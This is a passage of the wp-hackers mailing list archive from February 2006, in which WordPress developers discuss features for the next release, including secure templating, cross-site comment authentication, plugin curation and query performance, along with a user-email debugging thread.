From: chrome at stupendous.net (Nathan Ollerenshaw)
Date: Tue Feb  7 10:51:10 2006
Subject: [wp-hackers] Ideas for new features. (3.x?)
In-Reply-To: <aa74b1910602070139t4e8eaf2cwe116aaab958f2e99@mail.gmail.com>
References: <43E7AD17.6060907@mullenweg.com>
	<CC0F38E3-4474-4A8D-B3D5-CBB0F6DAD74C@stupendous.net>
	<aa74b1910602070139t4e8eaf2cwe116aaab958f2e99@mail.gmail.com>
Message-ID: <7BF34D7E-A216-480E-9211-6846D5BE6154@stupendous.net>

Hi Sam,

On Feb 7, 2006, at 6:39 PM, Sam Angove wrote:

> There was a discussion about this last September. [1] (All the
> messages with "separation of application logic from presentation
> logic" in the title.) See especially [2].
>
> IIRC WordPress MU already supports Smarty, and there's a modification
> of 1.5 called SmartyPress.
>
> If not one of those, it's fairly easy to write something yourself to
> compile safe templates into actual code -- the users don't get to
> touch real code. LiveJournal, MT, etc. all work this way. I wrote
> [read: stole from TextPattern] the beginnings of one this afternoon.
> [3]

I thought there must have been this kind of discussion before, but  
being time pressed I didn't check the archives back far enough, sorry.

Your point is well taken. I guess with the size of the code in  
Wordpress it must be a mammoth undertaking to move all that code AND  
test it and ensure nothing breaks.

>> 2. Cross-authenticated comments and trackbacks.
>
> That's what OpenID does, more or less. TypeKey and LiveJournal both
> use it, and there's a (possibly not working completely?) WP plugin
> available.

http://openid.net/ is pretty cool. I haven't gone through the specs.

Just goes to show, any good idea that is worth having is probably  
implemented by someone else ;) I guess I should have googled :) Ah well.

Thanks for the response.

Nathan.
From mark.wordpress at txfx.net  Tue Feb  7 11:38:14 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
Date: Tue Feb  7 11:39:44 2006
Subject: [wp-hackers] WP No longer display user emails
In-Reply-To: <43E866DC.6040608@phunky.co.uk>
References: <43E743CA.2060707@phunky.co.uk>
	<78279364-50D0-4DCB-8254-1016EF8B1B6B@txfx.net>
	<43E866DC.6040608@phunky.co.uk>
Message-ID: <5C4A03AC-543D-4956-9424-C4380DAC0DD4@txfx.net>

On Feb 7, 2006, at 4:22 AM, Mark Harwood wrote:

> I dont think you quite got what i was stating, the functions dont  
> return the email value in the array for use at all, not even thru  
> the back end!

$userdata isn't an array... don't know if that's where you're getting  
hung up.  It's an object.

I'm looking at the code, and it's still being set.  In fact, if it  
weren't, post authors wouldn't be notified of comments on their  
posts.  So something is up with your install.

> 	$user_email	= $userdata->user_email;

I'd re-upload all the /wp-includes/ files, especially pluggable- 
functions.php
--
Mark Jaquith
http://txfx.net/


From steagl at people.it  Tue Feb  7 11:42:09 2006
From: steagl at people.it (Stefano)
Date: Tue Feb  7 11:44:00 2006
Subject: [wp-hackers] Simplicity in 2.next
References: <43E7AD17.6060907@mullenweg.com> <43E7B905.4000304@tamba2.org.uk>
	<43E7BF44.1090605@boren.nu>
Message-ID: <tc1hu1dotqrodf79dc0kj8ihtfdktme1om@4ax.com>

Il Mon, 06 Feb 2006 13:27:32 -0800, Ryan Boren <ryan@boren.nu> scrive:

>> For the next version ? Test the hell out of the upgrade - there are an
>> awful lot of people who experienced problems in this upgrade and the
>> WSOD as mentioned here before hasn't helped.
>
>Were there any upgrade problems not attributable to a plugin?  Every one 
>I saw was attributable to a plugin that tripped over 1 of 2 small fixes 
>that broke some expectations.

I agre, maybe would be a good choise have a set of popular plugins and
themes with a sort of "WP Qaulity Products" ribbon, that get more
visibility on wp.org. This "ribbon" will be given to themes and plugis
that authors agree to deeply test against new release before they goes
public.

This will assure people that this plugins will works flawlessy. Asking
for support should decrease a bit, and in a couple of release these
plugins will become quite "standards" for people, making them having
no o little trouble, less trfic to forums, and plugin developers happy
for the visibility theyr products have.

At the end i prefere to have a good strong, safe, single plugins for
exmple grvatars than 5 plugins quite similar and boken 3 out 5 at
every release

-- 

Stefano Aglietti - StallonIt on IRCnet - ICQ#: 2078431
Email: steve@40annibuttati.it steagl@people.it
Sites: http://www.40annibuttati.it (personal blog)
       http://www.wordpress-it.it (WordPress Italia)
From mark at phunky.co.uk  Tue Feb  7 11:55:18 2006
From: mark at phunky.co.uk (Mark Harwood)
Date: Tue Feb  7 11:54:53 2006
Subject: [wp-hackers] WP No longer display user emails
In-Reply-To: <5C4A03AC-543D-4956-9424-C4380DAC0DD4@txfx.net>
References: <43E743CA.2060707@phunky.co.uk>	<78279364-50D0-4DCB-8254-1016EF8B1B6B@txfx.net>	<43E866DC.6040608@phunky.co.uk>
	<5C4A03AC-543D-4956-9424-C4380DAC0DD4@txfx.net>
Message-ID: <43E88AA6.6070709@phunky.co.uk>

yeah sorry, i meant the $userdata object ( i always just call them 
arrays :S)

I've just deleted and re-uploaded all the files to see if there was any 
issuse with the upload, but due to the fact that it pull back everything 
but the user_email i highly doubt it.

As this is not a live site no emails are sent but i would guess that due 
to it not displaying the emails in the backend that it also would not 
notify authors of comments.

Ive disabled all custom plugins and it still refuses to pull back the 
email in the $userdata->object

Mark


Mark Jaquith wrote:

> On Feb 7, 2006, at 4:22 AM, Mark Harwood wrote:
>
>> I dont think you quite got what i was stating, the functions dont  
>> return the email value in the array for use at all, not even thru  
>> the back end!
>
>
> $userdata isn't an array... don't know if that's where you're getting  
> hung up.  It's an object.
>
> I'm looking at the code, and it's still being set.  In fact, if it  
> weren't, post authors wouldn't be notified of comments on their  
> posts.  So something is up with your install.
>
>>     $user_email    = $userdata->user_email;
>
>
> I'd re-upload all the /wp-includes/ files, especially pluggable- 
> functions.php
> -- 
> Mark Jaquith
> http://txfx.net/
>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From heilemann at gmail.com  Tue Feb  7 12:58:44 2006
From: heilemann at gmail.com (Michael Heilemann)
Date: Tue Feb  7 13:00:15 2006
Subject: [wp-hackers] Wiki Wiki WordPress
In-Reply-To: <43E76DED.7090805@atl.lmco.com>
References: <5a715c0a0602040539w63815d20n7e74e8218172a2fc@mail.gmail.com>
	<43E76DED.7090805@atl.lmco.com>
Message-ID: <5a715c0a0602070458hf646fa6o9f1095030a385590@mail.gmail.com>

Doh! Thanks Doug.

On 2/6/06, Doug Stewart <dstewart@atl.lmco.com> wrote:
> Michael Heilemann wrote:
> > Hey,
> >
> > I've set up a discussion forum for the creation of Wiki tools for
> > WordPress. If you're interested in participating in the creation of
> > such, feel free to chime in.
> >
> > Message Ends.
> >
>
> As an addition to Michael's message, you may find all BB discussions at
> his forum, http://binarybonsai.com/forums.  The discussion in question
> resides here:
> http://binarybonsai.com/forums/comments.php?DiscussionID=490
>
>
> --
> ----------
> Doug Stewart
> Systems Administrator/Web Applications Developer
> Lockheed Martin Advanced Technology Labs
> dstewart@atl.lmco.com
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>


--
Aloha,
Michael Heilemann
http://binarybonsai.com
From d.ben.antieau at gmail.com  Tue Feb  7 13:43:07 2006
From: d.ben.antieau at gmail.com (D. Benjamin Antieau)
Date: Tue Feb  7 13:47:10 2006
Subject: [wp-hackers] Ideas for new features. (3.x?)
In-Reply-To: <CC0F38E3-4474-4A8D-B3D5-CBB0F6DAD74C@stupendous.net>
References: <43E7AD17.6060907@mullenweg.com>
	<CC0F38E3-4474-4A8D-B3D5-CBB0F6DAD74C@stupendous.net>
Message-ID: <b0677d3b0602070543p3481db9re473b4ae3c0a961b@mail.gmail.com>

Your description of how cross-authentication might work does not take into
account potential commenters lacking a blog. How would they get
authenticated? Surely having a blog should not be a requirement for entry.

On 2/6/06, Nathan Ollerenshaw <chrome@stupendous.net> wrote:
>
> I'm new to this list, so I hope people can excuse my boldness.
>
> I've been giving some thought to what I would like out of a blogging
> tool. A few things stand out in my mind, some as a system engineer
> who would like to integrate Wordpress into a hosted environment for
> his users, and some as a user.
>
> 1. Securely editable templates.
>
> Some of the approaches to this have been to allow only CSS files to
> be uploaded/edited - but there are some problems with this security
> wise. Other approaches are to allow .php files to be uploaded/edited
> but have a list of PHP functions that may be used and reject the
> template if anything else appears.
>
> Personally, I don't like either of these approaches. I think that
> using Smarty makes a lot more sense, as it completely separates logic
> away from template design with the secure mode enabled.
>
> So I would like to see Wordpress move away from having php code
> directly in the templates, and all of the HTML code move outside of
> the PHP into the templates. I humbly suggest hunting down all
> instances of
>
>     echo "<p>$something</p>";
>
> and moving them into smarty templates.
>
> With the right variables being fed into each template, one could
> offer the template designer a huge amount of power in terms of what
> is displayed on each page, without having to expose any code to him.
>
> 2. Cross-authenticated comments and trackbacks.
>
> Hoo boy. This is something I've been thinking about for a while, to
> try and fix some aspects of the comment spam/traceback spam issue.
> None of the methods currently in use are particularly ideal, and
> something that doesn't exist in the core doesn't get used by most
> blogs - most of the blogs out there are clean installs with no
> plugins (or maybe a couple).
>
> What do I mean by 'cross-authentication'?
>
> Well, let me describe from a user point of view.
>
> Step 1: An external (ie, he is not registered to your blog) user
> views your blog. He wants to make a comment. He types his comment
> into your comments page, puts in his username (on HIS blog) in the
> name field, and puts the URL to HIS blog in the Website: field.
>
> Step 2: He presses Submit. Wordpress stores the comment in the
> comments DB and redirects to the remote user's blog's URL + something
> like "/verify-post.php?action=verify&postid=<postid>".
>
> Step 3: The remote user's blog connects to YOUR blog via verify-
> post.php and grabs the comment (via XML, whatever).
>
> Step 4: It then checks the remote user's cookies, and if he's logged
> in as the user specified in the username field, it creates a
> cryptographic hash (MD5 maybe) consisting of the post text, the user
> name and a secret key (not the password). It stores this in the
> database locally in case any comment needs to be reverified. If the
> user is NOT logged in, present a login form, let the guy
> authenticate, and then continue as if he was.
>
> Step 5: Remote blog pushes back to YOUR blog this hash with a token
> of "approved" or something like that.
>
> Step 6: Your blog marks the comment as "verified" and stores the hash
> in case this comment needs to be re-verified in the future.
>
> Step 7: Remote blog redirects user back to your comments page, which
> then can be configured to display the comment without moderation.
>
> This all could be done with AJAX maybe? Not sure how AJAX works but
> if I understand the gist of it, the redirect between the two sites
> could be done transparently to the user, except in the case that the
> user didn't have a valid cookie for his site.
>
> This methodology could be applied to trackbacks as well, but
> transparently to the user so that the blog receiving the tackback
> ping can check with the originating blog that it sent the ping. (Does
> this happen already? I don't know how trackbacks work under the hood).
>
> What does this buy us?
>
> A distributed authentication system, which allows anyone who has a
> blog that implements this system to comment onto anyone else's blog
> that implements this system without fear that they can be
> impersonated, or their comments modified by the site owners. (A
> 'verify this comment' button can be on the page, which redirects to
> the commenter's site which then displays a "this comment is verified
> as authentic" message along with the comment text)
>
> If I am an impersonator and try to post as you on my blog, if my blog
> implements this code it will check back with your blog and I won't be
> able to log in and authenticate.
>
> I can hack my blog to skip that step, and "pretend" to request
> authorisation for comments, but that would be easily detectable by
> anyone who wanted to check, because they can just click 'verify this
> comment'.
>
> The other thing it buys us is that spammers have to set up a working
> blog for them to be able to comment on our blog - suddenly the cost
> of comment spam goes up. And on our side, we can just do blanket
> "Disallow comments from this url" or even allow regexs so if the
> spammer uses a predictable blogname, we can block all instances of
> it. Or just go and post on HIS blog and call him names. Whatever :)
>
> Admittedly, I haven't thought about this too hard yet, and I don't
> know if it would work, but I'd like people's feedback on it - there
> are probably other ways to achieve the same thing, and probably other
> benefits and drawbacks, so it would be nice to know them.
>
> "Show me the code!"
>
> I'm working on code as a proof of concept, but its not a part of
> wordpress yet as I was getting a headache trying to decypher how
> wordpress works internally and its easier for me to just write a
> proof-of-concept blog tool and demonstrate that, and have someone
> else come along and get it working in WP.
>
> Um, thats it! Just two for now. Maybe more later. This mail got too
> long :)
>
> Cheers.
>
> Nathan.
>
> On Feb 7, 2006, at 5:09 AM, Matt Mullenweg wrote:
>
> > The last thread about the next version of WP had some interesting
> > ideas in it, but I think the question may have been framed the
> > wrong way. What I'm far more interested in working on for the next
> > version is this:
> >
> > How can we make WordPress simpler in the next release?
> >
> > How can we reduce support requests on the forums?
> >
> > How can we make it faster?
> >
> > (To riff on an idea, consider starting a new thread.)
> >
> > --
> > Matt Mullenweg
> >  http://photomatt.net | http://wordpress.org
> > http://automattic.com | http://akismet.com
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers@lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
From chrome at stupendous.net  Tue Feb  7 14:26:16 2006
From: chrome at stupendous.net (Nathan Ollerenshaw)
Date: Tue Feb  7 14:27:47 2006
Subject: [wp-hackers] Ideas for new features. (3.x?)
In-Reply-To: <b0677d3b0602070543p3481db9re473b4ae3c0a961b@mail.gmail.com>
References: <43E7AD17.6060907@mullenweg.com>
	<CC0F38E3-4474-4A8D-B3D5-CBB0F6DAD74C@stupendous.net>
	<b0677d3b0602070543p3481db9re473b4ae3c0a961b@mail.gmail.com>
Message-ID: <977745C5-E8B7-4034-BBFF-3AC40F1528F6@stupendous.net>

On Feb 7, 2006, at 10:43 PM, D. Benjamin Antieau wrote:

> Your description of how cross-authentication might work does not  
> take into
> account potential commenters lacking a blog. How would they get
> authenticated? Surely having a blog should not be a requirement for  
> entry.

Well, obviously :)

Nathan.
From skippy at skippy.net  Tue Feb  7 14:54:58 2006
From: skippy at skippy.net (Scott Merrill)
Date: Tue Feb  7 14:56:09 2006
Subject: [wp-hackers] Development for 2.next
In-Reply-To: <43E15349.6060708@boren.nu>
References: <43E15349.6060708@boren.nu>
Message-ID: <43E8B4C2.7080909@skippy.net>

Ryan Boren wrote:
> A few development ideas for the next release, including proposed
> implementations.
...
> What else?

A "ready for publication" button that low-level authors can press to
signify that their draft is complete.  This is distinct from "saving",
as it says "this is done, and ready".  This should do at least two things:
* send an email to all editors announcing a completed draft ready for
publication
* display a link to the draft in an area _other_ than the "Other
people's Drafts" list.  This other area should be visually disambiguated
to indicate that the items listed there are _not_ drafts.

-- 
skippy@skippy.net | http://skippy.net/

gpg --keyserver pgp.mit.edu --recv-keys 9CFA4B35
506C F8BB 17AE 8A05 0B49  3544 476A 7DEC 9CFA 4B35
From mark at phunky.co.uk  Tue Feb  7 14:59:43 2006
From: mark at phunky.co.uk (Mark Harwood)
Date: Tue Feb  7 14:59:21 2006
Subject: [wp-hackers] Development for 2.next
In-Reply-To: <43E8B4C2.7080909@skippy.net>
References: <43E15349.6060708@boren.nu> <43E8B4C2.7080909@skippy.net>
Message-ID: <43E8B5DF.2030102@phunky.co.uk>

I like the idea of this very much, for the more larger news sites with 
multiple authors this kinda functionality is a much needed addition!

Mark
Founder of EuroCSS.NET

Scott Merrill wrote:

>Ryan Boren wrote:
>  
>
>>A few development ideas for the next release, including proposed
>>implementations.
>>    
>>
>...
>  
>
>>What else?
>>    
>>
>
>A "ready for publication" button that low-level authors can press to
>signify that their draft is complete.  This is distinct from "saving",
>as it says "this is done, and ready".  This should do at least two things:
>* send an email to all editors announcing a completed draft ready for
>publication
>* display a link to the draft in an area _other_ than the "Other
>people's Drafts" list.  This other area should be visually disambiguated
>to indicate that the items listed there are _not_ drafts.
>
>  
>

From dstewart at atl.lmco.com  Tue Feb  7 15:05:58 2006
From: dstewart at atl.lmco.com (Doug Stewart)
Date: Tue Feb  7 15:07:29 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <773fe1ad06616a23b4a392dac3e81b6a@imap.scorpionshops.com>
References: <773fe1ad06616a23b4a392dac3e81b6a@imap.scorpionshops.com>
Message-ID: <43E8B756.10609@atl.lmco.com>

Mattias Winther wrote:
> This might have been discussed before, but another idea would be to allow for a more automatic installation process for the plugins in the central repository. Just switch to the extension browser, search for it, and click "install". The server downloads, places the files where they should be, and turns it on. Viola!
> 
> Typo3 at typo3.com uses that approach, and it is really nice to not have to download to desktop, upload to server and so forth... But maybe the Wordpress situation is different? If combined with the version checks, 
> I imagine that would reduce the amount of support requests saying "Why can't I install plug-in X?". Then again, I'm new here, and I don't really know which support forum questions are the real common ones.
> 
> Life,
> 
> /MW

Alchemy and Elixir were supposed to do something, but I believe 
development has stalled as the webpage hasn't been updated in ages (and 
the promised screenshots never delivered...).

-- 
----------
Doug Stewart
Systems Administrator/Web Applications Developer
Lockheed Martin Advanced Technology Labs
dstewart@atl.lmco.com
From dstewart at atl.lmco.com  Tue Feb  7 15:07:51 2006
From: dstewart at atl.lmco.com (Doug Stewart)
Date: Tue Feb  7 15:09:18 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <43E8B756.10609@atl.lmco.com>
References: <773fe1ad06616a23b4a392dac3e81b6a@imap.scorpionshops.com>
	<43E8B756.10609@atl.lmco.com>
Message-ID: <43E8B7C7.3050101@atl.lmco.com>

Doug Stewart wrote:
> Alchemy and Elixir were supposed to do something, but I believe 
> development has stalled as the webpage hasn't been updated in ages (and 
> the promised screenshots never delivered...).
> 

Bah, replying to myself:

Alchemy and Elixir were supposed to do something *similar to what you 
were requesting*.

Website here:
http://wp-elixir.com

-- 
----------
Doug Stewart
Systems Administrator/Web Applications Developer
Lockheed Martin Advanced Technology Labs
dstewart@atl.lmco.com
From carthik at gmail.com  Tue Feb  7 15:09:27 2006
From: carthik at gmail.com (Carthik Sharma)
Date: Tue Feb  7 15:11:00 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <43E7E144.4090802@boren.nu>
References: <43E7AD17.6060907@mullenweg.com> <43E7B905.4000304@tamba2.org.uk>
	<43E7BF44.1090605@boren.nu> <43E7C266.9000309@tamba2.org.uk>
	<43E7C829.9040505@boren.nu> <43E7CAF6.9010303@tamba2.org.uk>
	<5aa3aa0602061426n3613221ay7754b236a9d7a863@mail.gmail.com>
	<43E7DADA.4090700@ebroder.net> <43E7E144.4090802@boren.nu>
Message-ID: <80f75db0602070709q37105025hebaf31a3a6d4bffb@mail.gmail.com>

On 2/6/06, Ryan Boren <ryan@boren.nu> wrote:
> Evan Broder wrote:
> > I would expect that, if people don't already have their plugins
> > currently hosted on wp-plugins.org, they aren't going to be easily
> > convinced to move them.
>  >
> > I have a plugin that I host in my own webspace. It's a bit of a hassle
> > when I release a new version, but wp-plugins.org is way overkill for my
> > development setup. The wiki and Subversion are really overkill for what
> > I need.
>
> If a plugin author doesn't want to use wp-plugins, that's his choice.
> Plugins not in the wp-plugins repository simply won't get the developer
> attention that plugins that do reside in wp-plugin will get.  If they
> break, they'll be left broken. I haven't the time or the inclination to
> chase plugins hither, thither, and yon.  It's the linux kernel approach.
>   If it's not in the tree, it is on its own.
>
> Those plugins in the wp-plugins tree will get some extra love.  We'll
> write automation that will run over the entire repository looking for
> common mistakes and deprecated usage, for example.  We'll commit fixes
> and try to keep the plugins up-to-date.  It's a big task that is
> thoroughly impractical without a common repository.
>
> I'd like to have a group of plugin gardeners with full commit access to
> wp-plugins.
>

I second this idea:
Plugin gardeners or Electricians/Plumbers should:
1) Test existing plugins for compliance,security and coding style
(Someone should write up a checklist or testing regimen)
2) Accept and commit new submissions
3) Guide (hand-hold) new plugin authors who want to be at wp-plugins.org
4) Maintain other authors' plugins in case the original plugin author
does not want to deal with using SVN and including his/her plugin in
the wp-plugins.org website, but still wouldn't mind his/her plugin
being uploaded there by a maintainer.

Maybe we should start with a small group and then grow if and when neccessary.

I think the one thing we know for sure is saying "plugins are not
supported" or even thinking  that way reflects poorly vis-a-vis
user-experience as also the users' perception of WP.

Carthik.
> Ryan
>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>


--
Ph.D. Candidate
University of Central Florida
Homepage: http://carthik.net
From carthik at gmail.com  Tue Feb  7 15:11:32 2006
From: carthik at gmail.com (Carthik Sharma)
Date: Tue Feb  7 15:13:01 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <5aa3aa0602061722vfd65201w8e997f529c495702@mail.gmail.com>
References: <43E7AD17.6060907@mullenweg.com> <43E7B905.4000304@tamba2.org.uk>
	<43E7BF44.1090605@boren.nu> <43E7C266.9000309@tamba2.org.uk>
	<43E7C829.9040505@boren.nu> <43E7CAF6.9010303@tamba2.org.uk>
	<5aa3aa0602061426n3613221ay7754b236a9d7a863@mail.gmail.com>
	<43E7DADA.4090700@ebroder.net> <43E7E144.4090802@boren.nu>
	<5aa3aa0602061722vfd65201w8e997f529c495702@mail.gmail.com>
Message-ID: <80f75db0602070711r1c8107c0k1fe38a5bb6bd7c7e@mail.gmail.com>

On 2/6/06, Craig <nuclearmoose@gmail.com> wrote:
> Ryan said:
> "Plugins not in the wp-plugins repository simply won't get the developer
> attention that plugins that do reside in wp-plugin will get."
>
> Ryan,
> I don't disagree with your points at all, and certainly I like that there
> would be an advantage for plugins that are in the repository to get some
> developer-lovin', but part of this discussion is around trying to reduce
> some of the support issues on wordpress.org. Unless the support forums go
> the way of "official support only for repository-registered plugins" this
> won't reduce the traffic on the support forum.
>
> Not a simple issue, to be sure. Time to put the thinking cap back on and
> ponder this a bit more...
>

Craig, if you provide plugins which are known-good (or even
known-better) hopefully people will start using them in preference to
others that are not "known" to be well behaved. This will reduce
support requests, at least during upgrades by more than a little.

Carthik.
> Craig.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>


--
Ph.D. Candidate
University of Central Florida
Homepage: http://carthik.net
From dstewart at atl.lmco.com  Tue Feb  7 15:11:42 2006
From: dstewart at atl.lmco.com (Doug Stewart)
Date: Tue Feb  7 15:13:10 2006
Subject: [wp-hackers] Wiki Wiki WordPress
In-Reply-To: <5a715c0a0602070458hf646fa6o9f1095030a385590@mail.gmail.com>
References: <5a715c0a0602040539w63815d20n7e74e8218172a2fc@mail.gmail.com>
	<43E76DED.7090805@atl.lmco.com>
	<5a715c0a0602070458hf646fa6o9f1095030a385590@mail.gmail.com>
Message-ID: <43E8B8AE.90609@atl.lmco.com>

Michael Heilemann wrote:
> Doh! Thanks Doug.

*grin* No prob.

-- 
----------
Doug Stewart
Systems Administrator/Web Applications Developer
Lockheed Martin Advanced Technology Labs
dstewart@atl.lmco.com
From mark at phunky.co.uk  Tue Feb  7 16:30:09 2006
From: mark at phunky.co.uk (Mark Harwood)
Date: Tue Feb  7 16:29:44 2006
Subject: [wp-hackers] update_user_option() Not quite working right.
Message-ID: <43E8CB11.3040606@phunky.co.uk>

(This is kinda a follow up to my last email which i was having problem 
with emails no displaying.)

Hey All,

Im in the process of writing a little Profile Plugin to allow for more 
options to be attached to a registered user, but im having issuse 
updating email and url of the user.

update_user_option() does not seem to want to update wp_user table as i 
thought it would, instead it inserts the option in to wp_usermeta which 
is fine, but the issuse is that WordPress falls over with user_email 
being placed in wp_usermeta. It refuses to pull back the users email and 
in the case of the URL it gets confused into which one to display and 
update :(

Any ideas how we to just change the feilds in wp_user instead of having 
update_user_option() add them into the wp_usermeta table?

The source for the plugin can be found at the below URL
http://pastecode.net/?action=viewpost&tag=650

Many Thanks
Mark 'Phunky' Harwood
Founder of EuroCSS.NET
From newsletter at scytheman.net  Tue Feb  7 16:57:07 2006
From: newsletter at scytheman.net (Sebastian Herp)
Date: Tue Feb  7 16:58:46 2006
Subject: [wp-hackers] 2.next - faster
In-Reply-To: <8e1656660602061240m46e83979nbf5df64f085bf485@mail.gmail.com>
References: <8e1656660602061240m46e83979nbf5df64f085bf485@mail.gmail.com>
Message-ID: <43E8D163.1010308@scytheman.net>

Speeding things up in 2.next would be nice. Making the function 
"current_time()" pluggable (overwriting it with something using the 
value from the following plugin), together with a plugin like the one 
found here (http://txfx.net/files/wordpress/post-query-accelerator.phps) 
would greatly improve the chance that a query can be cached by mysql 
itself. I did this on a blog and the overall time needed for queries is 
now 30ms if they are all in the mysql cache which is the case most of 
the time!!!

However, this is not the main time eater on my setup. It's mainly the 
php code execution. Wordpress (always on my server and speaking of the 
frontpage) takes 150 to 200 ms to get to the point where it actually 
outputs html. The other big thing is the content loop. Formatting every 
posting each time takes a while. Getting categories and other 
information also eats some milliseconds. Summed up the content display 
stuff takes around 300 ms to execute.

So it's nearly 500 ms for code execution version 30 ms for mysql queries 
... fix the code I say :-) We can savely assume that hosters use 
powerful hardware with caches everywhere. They would be stupid not to ...

What needs to be done to improve Wordpress' performance (in my opinion)?
1. don't use now() or aquivalents in any query! That one should be core 
and not solved with a plugin!
2. find out what takes so long before content is displayed (it's not a 
sql query!)
3. don't filter the content of posts/comments each time they are 
displayed, instead do it on updates of the content only (the columns for 
that exist in the database) This should also be core and not solved with 
a plugin!
4. fix the content loop! The  posts array should include all necessary 
information (kategories with names, comment cound, etc) without the need 
for seperate queries or whatever happens in those getter-functions that 
lets them eat away so many precious milliseconds.
5. encourage plugin authors of popular plugins to do some performance 
tuning, too ;-)

Greetings,
Sebastian

Scott johnson wrote:
> Faster, imho, involves tradeoffs at this point. My gut just on web apps is
> that faster means "look hard at the SQL".  For example I learned TONS about
> mysql scaling at Feedster that I think is applicable but it starts to get
> specialized like memcache support, write versus read servers, etc.,
> seriously playing with your table structure, etc.
>
> Faster in what environment???  I'm happy to contribute ideas but given the
> spectrum of sites WP runs on this question has major ramifications
>
> Scott
>
>   

From steagl at people.it  Tue Feb  7 17:37:28 2006
From: steagl at people.it (Stefano)
Date: Tue Feb  7 17:39:17 2006
Subject: [wp-hackers] Simplicity in 2.next
References: <43E7AD17.6060907@mullenweg.com> <43E7B905.4000304@tamba2.org.uk>
	<43E7BF44.1090605@boren.nu> <43E7C266.9000309@tamba2.org.uk>
	<43E7C829.9040505@boren.nu> <43E7CAF6.9010303@tamba2.org.uk>
	<5aa3aa0602061426n3613221ay7754b236a9d7a863@mail.gmail.com>
	<43E7DADA.4090700@ebroder.net> <43E7E144.4090802@boren.nu>
	<80f75db0602070709q37105025hebaf31a3a6d4bffb@mail.gmail.com>
Message-ID: <ddmhu1h4vhffvulrhmcko0dltrmvvka23n@4ax.com>

Il Tue, 7 Feb 2006 10:09:27 -0500, Carthik Sharma <carthik@gmail.com>
scrive:

>> Those plugins in the wp-plugins tree will get some extra love.  We'll
>> write automation that will run over the entire repository looking for
>> common mistakes and deprecated usage, for example.  We'll commit fixes
>> and try to keep the plugins up-to-date.  It's a big task that is
>> thoroughly impractical without a common repository.
>>
>> I'd like to have a group of plugin gardeners with full commit access to
>> wp-plugins.
>
>I second this idea:
>Plugin gardeners or Electricians/Plumbers should:
>1) Test existing plugins for compliance,security and coding style
>(Someone should write up a checklist or testing regimen)
>2) Accept and commit new submissions
>3) Guide (hand-hold) new plugin authors who want to be at wp-plugins.org
>4) Maintain other authors' plugins in case the original plugin author
>does not want to deal with using SVN and including his/her plugin in
>the wp-plugins.org website, but still wouldn't mind his/her plugin
>being uploaded there by a maintainer.
>
>Maybe we should start with a small group and then grow if and when neccessary.

This was wht i said in my post in this thread earlier today and this
was the taget i signed myself on Responsabilities page
(http://codex.wordpress.org/User:Matt/WordPress_Responsibilities),
caring paarticualary about the fact that plugins nd themesborn
internationalized, and locales .mo files for plugins and maybe for the
docs attached (readme etc) get translated by the team that already
does for WP.

I think you idea it's really good, taking more care for plugin in
wp-plugins.org (and theme too) means to give those plugins a sort of
"WP Quality Ribbon". If you wanna sign me as one of volunteer i'll be
happy to help in this.

-- 

Stefano Aglietti - StallonIt on IRCnet - ICQ#: 2078431
Email: steve@40annibuttati.it steagl@people.it
Sites: http://www.40annibuttati.it (personal blog)
       http://www.wordpress-it.it (WordPress Italia)
From nuclearmoose at gmail.com  Tue Feb  7 17:52:03 2006
From: nuclearmoose at gmail.com (Craig)
Date: Tue Feb  7 17:53:35 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <80f75db0602070711r1c8107c0k1fe38a5bb6bd7c7e@mail.gmail.com>
References: <43E7AD17.6060907@mullenweg.com> <43E7BF44.1090605@boren.nu>
	<43E7C266.9000309@tamba2.org.uk> <43E7C829.9040505@boren.nu>
	<43E7CAF6.9010303@tamba2.org.uk>
	<5aa3aa0602061426n3613221ay7754b236a9d7a863@mail.gmail.com>
	<43E7DADA.4090700@ebroder.net> <43E7E144.4090802@boren.nu>
	<5aa3aa0602061722vfd65201w8e997f529c495702@mail.gmail.com>
	<80f75db0602070711r1c8107c0k1fe38a5bb6bd7c7e@mail.gmail.com>
Message-ID: <5aa3aa0602070952o204c763ej5ed0270fac2377c6@mail.gmail.com>

> Craig, if you provide plugins which are known-good (or even
> known-better) hopefully people will start using them in preference to
> others that are not "known" to be well behaved. This will reduce
> support requests, at least during upgrades by more than a little.
>
> Carthik.



Very true, however there are many quality plugins that I know and trust that
aren't on the repository. I guess the question is really how do we get the
authors to move their stuff over to wp-plugins.org?

I would be willing to help out authors in writing/editing instructions or
other basic documentation. Can't help with the code, of course, but maybe I
can help to lessen the work around maintaining the plugin.

Is there a place for the non-coder in wp-plugins.org?

Craig.
From carthik at gmail.com  Tue Feb  7 18:15:28 2006
From: carthik at gmail.com (Carthik Sharma)
Date: Tue Feb  7 18:16:57 2006
Subject: [wp-hackers] Simplicity in 2.next
In-Reply-To: <5aa3aa0602070952o204c763ej5ed0270fac2377c6@mail.gmail.com>
References: <43E7AD17.6060907@mullenweg.com> <43E7C266.9000309@tamba2.org.uk>
	<43E7C829.9040505@boren.nu> <43E7CAF6.9010303@tamba2.org.uk>
	<5aa3aa0602061426n3613221ay7754b236a9d7a863@mail.gmail.com>
	<43E7DADA.4090700@ebroder.net> <43E7E144.4090802@boren.nu>
	<5aa3aa0602061722vfd65201w8e997f529c495702@mail.gmail.com>
	<80f75db0602070711r1c8107c0k1fe38a5bb6bd7c7e@mail.gmail.com>
	<5aa3aa0602070952o204c763ej5ed0270fac2377c6@mail.gmail.com>
Message-ID: <80f75db0602071015k415e0db4xbcc27c479056f1e9@mail.gmail.com>

